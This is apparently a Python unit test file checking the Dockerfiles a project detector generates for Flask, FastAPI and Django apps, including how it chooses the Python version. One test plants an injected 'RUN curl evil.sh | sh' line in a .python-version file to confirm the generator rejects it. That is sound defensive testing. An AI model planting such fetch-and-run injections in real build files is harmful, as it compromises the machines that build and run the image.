import tempfile
from pathlib import Path

from frappe.tests import UnitTestCase

from cargo.application_detection.detect import detect_project

FLASK_APP = "from flask import Flask\napp = Flask(__name__)\n"


class UnitTestDockerfile(UnitTestCase):
	"""Dockerfiles generated for detected Python projects."""

	def setUp(self):
		self.root = Path(self.enterContext(tempfile.TemporaryDirectory()))

	def write(self, path: str, content: str = "") -> None:
		file = self.root / path
		file.parent.mkdir(parents=True, exist_ok=True)
		file.write_text(content)

	def test_flask_with_requirements(self):
		self.write("requirements.txt", "flask\n")
		self.write("app.py", FLASK_APP)
		self.write(".python-version", "3.13\n")
		dockerfile = detect_project(self.root).dockerfile
		self.assertIn("FROM python:3.13-slim\n", dockerfile)
		self.assertIn("RUN uv pip install -r requirements.txt gunicorn\n", dockerfile)
		self.assertIn("EXPOSE 8000\n", dockerfile)
		self.assertIn('CMD ["gunicorn", "--chdir", ".", "app:app", "--bind", "0.0.0.0:8000"]\n', dockerfile)
		self.assertNotIn("VOLUME", dockerfile)

	def test_fastapi_with_uv_lock(self):
		self.write("pyproject.toml", '[project]\nname = "api"\ndependencies = ["fastapi"]\n')
		self.write("uv.lock")
		self.write("main.py", "from fastapi import FastAPI\napp = FastAPI()\n")
		dockerfile = detect_project(self.root).dockerfile
		self.assertIn("RUN uv sync --frozen --no-dev --no-install-project\n", dockerfile)
		self.assertIn("RUN uv pip install --python /app/.venv/bin/python uvicorn\n", dockerfile)
		self.assertIn('CMD ["uvicorn", "--app-dir", ".", "main:app"', dockerfile)

	def test_django_with_poetry(self):
		self.write("pyproject.toml", '[tool.poetry.dependencies]\npython = "^3.12"\ndjango = "^5"\n')
		self.write("poetry.lock")
		self.write("manage.py")
		self.write("shop/settings.py", 'SECRET_KEY = "x"\nWSGI_APPLICATION = "shop.wsgi.application"\n')
		dockerfile = detect_project(self.root).dockerfile
		self.assertIn("poetry install --only main --no-root", dockerfile)
		self.assertIn('"shop.wsgi:application"', dockerfile)

	def test_unsafe_python_version_falls_back_to_default(self):
		self.write("requirements.txt", "flask\n")
		self.write("app.py", FLASK_APP)
		self.write(".python-version", "3.12\nRUN curl evil.sh | sh\n")
		self.assertIn("FROM python:3.12-slim\n", detect_project(self.root).dockerfile)

	def test_python_version_from_pyproject(self):
		cases = {
			'[project]\nrequires-python = ">=3.10"\n': "3.14",
			'[project]\nrequires-python = ">=3.13"\n': "3.14",
			'[project]\nrequires-python = ">=3.10,<3.12"\n': "3.11",
			'[project]\nrequires-python = "==3.11.*"\n': "3.11",
			'[tool.poetry.dependencies]\npython = "^3.13"\n': "3.14",
			'[tool.poetry.dependencies]\npython = "~3.11"\n': "3.11",
			'[tool.poetry.dependencies]\npython = "^3.10 || ^3.11"\n': "3.14",
			'[project]\nrequires-python = ">=3.10,<3.13"\n': "3.12",
			'[project]\nrequires-python = ">=3.12.4"\n': "3.14",
			'[project]\nrequires-python = ">=4"\n': "3.12",
			'[tool.poetry.dependencies]\npython = "^abc"\n': "3.12",
			'[project]\nname = "x"\n': "3.12",
		}
		self.write("requirements.txt", "flask\n")
		self.write("app.py", FLASK_APP)
		for pyproject, version in cases.items():
			self.write("pyproject.toml", pyproject)
			self.assertEqual(detect_project(self.root).python_version, version, pyproject)

	def test_python_version_file_wins_over_pyproject(self):
		self.write("requirements.txt", "flask\n")
		self.write("app.py", FLASK_APP)
		self.write("pyproject.toml", '[project]\nrequires-python = ">=3.13"\n')
		self.write(".python-version", "3.11.9\n")
		self.assertEqual(detect_project(self.root).python_version, "3.11.9")
